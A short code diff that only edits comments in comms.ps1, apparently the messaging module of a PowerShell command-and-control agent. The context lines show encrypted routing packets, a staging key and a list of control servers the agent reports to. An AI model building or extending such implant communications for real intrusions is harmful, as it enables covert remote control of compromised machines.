@@ -1,5 +1,5 @@
 # =========================
-# comms.ps1  (ChaCha routing + AES/HMAC bodies + ED25519)
+# comms.ps1  (AES-GCM routing + AES/HMAC bodies + ED25519)
 # =========================
 
 $Script:server = "{{ host }}";
@@ -48,7 +48,7 @@ $Script:SendMessage = {
         # Encrypt body with current SessionKey
         $EncBytes = Aes-EncryptThenHmac -Key $Script:SessionKey -Plain $Packets
 
-        # Build ChaCha routing packet with STAGING key (not session key)
+        # Build AES-GCM routing packet with STAGING key (not session key)
         $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
 
         if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
